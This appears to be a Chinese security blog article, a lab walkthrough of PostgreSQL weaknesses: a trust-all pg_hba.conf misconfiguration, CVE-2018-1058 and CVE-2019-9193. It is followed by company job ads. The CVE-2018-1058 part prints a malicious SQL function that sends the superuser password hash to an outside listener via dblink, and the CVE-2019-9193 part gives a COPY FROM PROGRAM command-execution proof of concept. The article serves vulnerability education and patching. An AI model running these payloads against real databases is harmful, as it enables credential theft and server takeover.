> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/t7xn7h0B9RcNpaSuVS8_Vg)

_**声明**_

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_**_**No.1  
**_**_

_**PostgreSQL 介绍**_

PostgreSQL(也称 postgres) 是一个自由的对象 - 关系数据库服务器 (数据库管理系统)，它在灵活的 BSD - 风格许可证下发行。它提供了相对其他开放源代码数据库系统 (比如 MySQL 和 Firebird)，和专有系统 (比如 Oracle 、Sybase、IBM 的 DB2 和 Microsoft SQL Server) 之外的另一种选择。

PostgreSQL 在国外的流行程度不亚 MySQL，如 msf 的数据库就是 PostgreSQL。但是如果管理员没有正确的配置 PostgreSQL，则会导致**任意用户无需密码**都可以访问 PostgreSQL 数据库。

_**_**No.2  
**_**_

_**PostgreSQL 未授权漏洞**_

**漏洞原因**

PostgreSQL 配置不当漏洞的形成原因：PostgreSQL 配置不当漏洞主要是由于管理员配置不当形成的，PostgreSQL 配置文件在 / var/lib/pgsql/9.2/data/pg_hba.conf，如果管理员没有正确的配置信任的主机（如下图），则会导致任意用户无需密码都可以访问 PostgreSQL 数据库。

这里简单介绍下 pg_hba.conf 配置文件，除去注释掉的部分，主要生效的配置内容就是上图红圈部分，解释下这行的意义：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWCrcXsRRuMSFwRYoT70wZ4vosqLBdEz4wLFibIN3wstFGic7oJUv8zo6vGOdQ8rC5fqibMic81xfTJGw/640?wx_fmt=png)

```
host    all     all     0.0.0.0/0       trust
```

host 表示匹配类型，第一个 all 表示任何数据库， 第二个 all 表示任何数据库用户的访问，0.0.0.0/0 表示任何 ip 地址访问本数据库服务，最后的 trust 表示对满足条件的主机免密码登录。

上述配置则导致：**允许任何来源 ip 主机，使用任何数据库账户，免密码访问任何数据库**，这将直接导致了数据库中所有数据泄露。

_**_**No.3  
**_**_

_**PostgreSQL 提权漏洞**_

_**（CVE-2018-1058）**_

通过 vulhub 搭建漏洞平台，登录到数据平台获取当前会话用户。  
postgres 提供了自定义函数的功能！我们创建如下函数：

```
CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$
    select dblink_connect((select 'hostaddr=192.168.8.10 port=7777 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres'))); 
    SELECT pg_catalog.array_to_string($1,$2);
$$ LANGUAGE SQL VOLATILE;
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWCrcXsRRuMSFwRYoT70wZ4xaENodlXCiaAa9TpOySDOAiaunZK7lqAYMYU93G1LibWHWEViayRQvsw2Q/640?wx_fmt=png)

然后在 1**.***.*.** 上监听 7777 端口，等待超级用户触发我们留下的这个 “后门”。  
用超级用户的身份执行 pg_dump 命令：

```
docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub
```

导出 vulhub 这个数据库的内容。

执行上述命令的同时，“后门” 已被触发，1**.***.*.*** 机器上已收到管理员 MD5 加密的密码：

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWCrcXsRRuMSFwRYoT70wZ4FUsaTPNbc2Luw11Y3ibL44Os9C9gKrCXQdibojyJyBs2zEqsZ09tjWNA/640?wx_fmt=png)

**漏洞修复**  

以下版本修复了该突破

```
PostgreSQL PostgreSQL 9.6.8 
PostgreSQL PostgreSQL 9.5.12 
PostgreSQL PostgreSQL 9.4.17 
PostgreSQL PostgreSQL 9.3.22
```

_**_**No.4  
**_**_

_**PostgreSQL 高权限命令执行漏洞**_

_**（CVE-2019-9193）**_  

**受影响版本**

• PostgreSQL 9.3 至 11.2

其 9.3 到 11 版本中存在一处 “特性”，管理员或具有“COPY TO/FROM PROGRAM” 权限的用户，可以使用这个特性执行任意命令。

首先连接到 postgres 中，并执行 POC：

```
DROP TABLE IF EXISTS cmd_exec; 

CREATE TABLE cmd_exec(cmd_output text); 

COPY cmd_exec FROM PROGRAM 'id'; 

SELECT * FROM cmd_exec;
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWCrcXsRRuMSFwRYoT70wZ4farSzmdffLF4fWGKNgFlUqiaK4kLsCFoCTsfWHiataewjqjcaLoCxCPA/640?wx_fmt=png)

**解决建议**  

pg_read_server_files、pg_write_server_files、pg_execute_server_program 角色涉及到读写数据库服务端文件，权限较大，分配此角色权限给数据库用户时需谨慎考虑。

_**招聘启事**_

安恒雷神众测 SRC 运营（实习生）  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

设计师（实习生）

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
3、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  
————————  
公司：安恒信息  
岗位：Web 安全 安全研究员  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：安全红队武器自动化工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

岗位：红队武器化 Golang 开发工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至 

bountyteam@dbappsecurity.com.cn

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWCrcXsRRuMSFwRYoT70wZ46b78KdDljKhGl63El4ibneMwjCibV4pQIk1m12y4HVkMiabPdakmW6qkw/640?wx_fmt=jpeg)

专注渗透测试技术

全球最新网络攻击技术

END

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWCrcXsRRuMSFwRYoT70wZ4g1l4RiaDbiaW0AmzxpeucYTk1IicghqiaHxq1Zf8suibZWWtBUyNqUvnaUw/640?wx_fmt=jpeg)